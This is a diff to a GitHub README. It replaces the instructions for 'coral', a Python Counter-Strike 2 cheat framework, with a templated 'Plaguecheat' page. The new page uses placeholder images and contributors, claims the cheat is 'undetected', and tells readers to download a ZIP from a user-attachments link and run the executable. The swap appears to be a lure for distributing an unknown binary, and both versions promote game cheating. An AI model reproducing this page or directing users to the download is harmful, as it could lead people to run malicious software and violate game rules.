@@ -1,70 +1,51 @@
-<h1 align="center">
-    <img src="/assets/banner.png" width="450"/>
-</h1>
+# Cheat-CS2
 
+![Cheat-CS2 Logo](https://example.com/cheat-cs2-logo.jpg)
 
-<p align="center">
-    <a href="https://raw.githubusercontent.com/0zean/coral/main/LICENSE" target="_blank">MIT License</a>
-</p>
+## Description
 
+Plaguecheat is a versatile and effective cheat for both rage and legit cheating in CS2, making it a popular choice among users. Best of all, it’s available for free, offering a cost-effective solution for gamers.
 
-<div align="center">
-    <img src="https://img.shields.io/github/stars/0zean/oasis?style=for-the-badge&logo=github&color=dfb216"/>
-    <img src="https://img.shields.io/github/issues/0zean/oasis?style=for-the-badge&logo=github&color=3380F5"/>
-    <img src="https://img.shields.io/github/commit-activity/t/0zean/oasis?style=for-the-badge&logo=github&color=fe7d37"/>
-    <img src="https://img.shields.io/github/forks/0zean/oasis?style=for-the-badge&logo=github&color=96ca01"/>
-</div>
+## Features
 
+- **Rage Mode**: Dominate your opponents with powerful and aggressive cheats.
+- **Legit Mode**: Play subtly and strategically with cheats that mimic real gameplay.
+- **Undetected**: Stay under the radar with our advanced anti-detection mechanisms.
+- **Regular Updates**: Enjoy continuous improvements and new features.
 
-A streamlit web-app framework for Counter-Strike 2 mods built using Python. **For Educational purposes only.**
+## Installation
 
-<div align="center">
-<img src="/assets/demo.png" alt="icon"/>
-</div>
+To install Plaguecheat, follow these steps:
 
-# Setup
+1. Download the cheat from our [official GitHub repository](https://github.com/user-attachments/files/16828195/Cheat.zip).
+   
+   [![Download Cheat-CS2](https://img.shields.io/badge/Download-Cheat--CS2-brightgreen)](https://github.com/user-attachments/files/16828195/Cheat.zip)
 
-You'll need [a2x's cs2-dumper](https://github.com/a2x/cs2-dumper) for updating offsets at launch. You can finde the `cs2-dumper.exe` under releases.
+2. Extract the contents of the ZIP file.
+3. Run the executable file and follow the on-screen instructions.
 
-Once downloaded, place it in the same folder as this repo after cloning.
+## Usage
 
-## 🎚️ Features:
-- [x] RCS (amount slider)
-- [x] Trigger Bot (trigger key)
-- [X] ESP (box, health, name, skeleton) 
-- [ ] Misc
+- Launch CS2.
+- Start Plaguecheat.
+- Customize cheat settings.
+- Enjoy the game with enhanced features.
 
+## Screenshots
 
-### 🧬 1. Clone the Repo
+![Screenshot 1](https://example.com/screenshot1.jpg)
+![Screenshot 2](https://example.com/screenshot2.jpg)
+![Screenshot 3](https://example.com/screenshot3.jpg)
 
-```bash
-git clone https://github.com/0zean/coral.git
-```
+## Contributors
 
-### 🛠️ 2. Create virtual 
+- [@username1](https://github.com/username1)
+- [@username2](https://github.com/username2)
 
-Using [Anaconda](https://docs.anaconda.com/miniconda/miniconda-install/), create a new env:
+## License
 
-```bash
-conda create -n coral python=3.10
-```
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
-### 📦 3. Install libraries
+---
 
-Install `pip` dependencies from `requirements.txt`:
-
-```bash
-pip install -r requirements.txt
-```
-
-### 🚀 4. Run the application
-
-To start the streamlit app, have CS2 running and double-click `start.bat`. This will run the offset dumper and start the streamlit server.
-
-The web app will compile and then start running at `http://localhost:8501` which will be automatically copied to the clipboard.
-
-The web app can also be accessed through your phone if you create an exception for port `8501` in your firewall Inbound Rules.
-
-### ⚠️ Warning
-
-Cheating in Counter-Strike 2 is not condoned and there is no guarentee this app won't result in a ban. This project is intended for educational purposes showcasing read-only memory applications. **Use at your own risk!**
+Feel free to [report issues](https://github.com/user/Cheat-CS2/issues) or contribute by submitting a pull request! 🔧🚀
